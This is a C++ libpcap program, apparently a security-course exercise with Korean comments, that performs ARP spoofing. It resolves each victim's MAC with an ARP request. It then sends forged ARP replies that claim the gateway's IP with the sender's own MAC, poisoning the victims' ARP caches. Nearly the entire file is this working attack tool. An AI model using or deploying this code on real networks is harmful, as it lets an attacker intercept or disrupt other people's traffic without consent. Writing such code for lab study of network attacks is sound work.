#include <cstdio>
#include <cstring>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "osi_hdr.h"
#include "ip.h"

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <victim-ip> <gateway-ip> [<victim-ip2> <gateway-ip2> ...]\n");
    printf("sample: send-arp-test wlan0 192.168.1.10 192.168.1.1\n");
}

struct myInfo {
    Mac mac_;
    Ip ip_;
};

// 나의 MAC과 IP를 안전하게 추출하는 함수
bool get_Address(const char* interface, Mac *mac_out, Ip *ip_out){
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) return false;

    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);

    // 1. MAC 주소 가져오기
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0){
        close(fd);
        return false;
    }
    *mac_out = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    // 2. IP 주소 가져오기 (여기가 SIOCGIFADDR 이어야 합니다!)
    if(ioctl(fd, SIOCGIFADDR, &ifr) < 0){
        close(fd);
        return false;
    }
    close(fd);

    struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
    *ip_out = Ip(ntohl(sin->sin_addr.s_addr));

    return true;
}

// 피해자 MAC 주소 추출 함수
Mac get_Vicmac(pcap_t* pcap, Mac my_mac, Ip myIP, Ip victimIP){
    EthArpPacket packet;

    // 이더넷 헤더 설정 (ARP Request용)
    packet.eth_.dmac_ = Mac::broadcastMac(); // ff:ff:ff:ff:ff:ff
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    // ARP 헤더 설정 (ARP Request용)
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = MAC_SIZE;
    packet.arp_.pln_ = IPv4_SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(myIP);
    packet.arp_.tmac_ = Mac::nullMac(); // 00:00:00:00:00:00
    packet.arp_.tip_ = htonl(victimIP);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        return Mac::nullMac();
    }

    struct pcap_pkthdr* hdr;
    const u_char* reply_packet;

    while(true){
        int cap_res = pcap_next_ex(pcap, &hdr, &reply_packet);
        if(cap_res == 0) continue;
        if(cap_res < 0){
            fprintf(stderr, "pcap_next_ex return %d error = %s\n", cap_res, pcap_geterr(pcap));
            break;
        }

        struct EthHdr* eth_hdr = (struct EthHdr*)reply_packet;
        if(ntohs(eth_hdr->type_) != EthHdr::Arp) continue;

        struct ArpHdr* arp_hdr = (struct ArpHdr*)(reply_packet + sizeof(struct EthHdr));
        if(ntohs(arp_hdr->op()) == ArpHdr::Reply){
            if(arp_hdr->sip() == victimIP) return arp_hdr->smac();
        }
        return Mac::nullMac();
    }
    return Mac::nullMac();
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 != 0)) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    myInfo me;

    if(!get_Address(dev, &me.mac_, &me.ip_)){
        fprintf(stderr, "couldn't extract MAC OR IP address from %s\n", dev);
        return EXIT_FAILURE;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    // 💡 공통으로 변하지 않는 ARP Spoofing 패킷 필드들을 미리 바깥에서 세팅합니다!
    EthArpPacket spoof_packet;

    spoof_packet.eth_.type_ = htons(EthHdr::Arp);
    spoof_packet.eth_.smac_ = me.mac_;

    spoof_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    spoof_packet.arp_.pro_ = htons(EthHdr::Ip4);
    spoof_packet.arp_.hln_ = MAC_SIZE;
    spoof_packet.arp_.pln_ = IPv4_SIZE;
    spoof_packet.arp_.op_ = htons(ArpHdr::Reply); // 위조된 ARP Reply 전송
    spoof_packet.arp_.smac_ = me.mac_;

    // IP 쌍을 순회하며 위조된 ARP Reply 패킷 전송
    for(int i = 2 ; i < argc ; i += 2){
        Ip victimIP(argv[i]);
        Ip gatewayIP(argv[i+1]);

        // 1. 피해자 MAC 주소 먼저 획득
        Mac victimMAC = get_Vicmac(pcap, me.mac_, me.ip_, victimIP);
        if(victimMAC == Mac::nullMac()){
            fprintf(stderr, "Failed to get MAC address for victim IP(%s)\n", argv[i]);
            continue;
        }
        printf("h");
        // 2. 피해자마다 달라지는 목적지/위조 필드만 루프 안에서 세팅
        spoof_packet.eth_.dmac_ = victimMAC;
        spoof_packet.arp_.tmac_ = victimMAC;
        spoof_packet.arp_.sip_ = htonl(gatewayIP); // 게이트웨이 IP로 Sender IP 위조
        spoof_packet.arp_.tip_ = htonl(victimIP);   // 피해자 IP 설정

        // 3. 패킷 전송
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&spoof_packet), sizeof(EthArpPacket));
        printf("e");
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        } else {
            printf("Send Spoofed ARP Reply -> Victim: %s | Spoofed Gateway: %s\n", argv[i], argv[i+1]);
        }
    }

    pcap_close(pcap);
    return 0;
}